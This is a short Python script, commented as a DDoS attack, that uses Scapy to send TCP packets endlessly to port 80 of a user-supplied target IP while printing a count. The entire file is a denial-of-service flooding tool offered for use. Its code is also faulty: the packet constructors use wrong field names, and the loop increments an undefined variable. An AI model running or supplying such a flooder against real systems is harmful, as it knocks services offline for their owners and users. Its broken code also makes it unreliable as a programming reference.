# importing scappy that is used to create packets
from scapy.all import *

# input IP and port number
source_IP = input("Enter the IP address of source machine: ")
target_IP = input("Enter IP address of target machine: ")
source_port = int(input("Enter the source port number: "))

# to keep track of number of packets
counter = 1

# infinite loop so packets are send idefinitely (DDoS attack)
while True:
	# IP and TCP info to create packets 
	ipInformation = IP(source_IP = source_IP, destination = target_IP)
	TCPInformation = TCP(srcport = source_port, dstport = 80)
	packet = ipInformation / TCPInformation
	
	# sending created packet 
	send(packet, inter = 0.001)

	# prinitng on screen the no of packets sent
	print("No of packets sent: ", counter)
	i = i + 1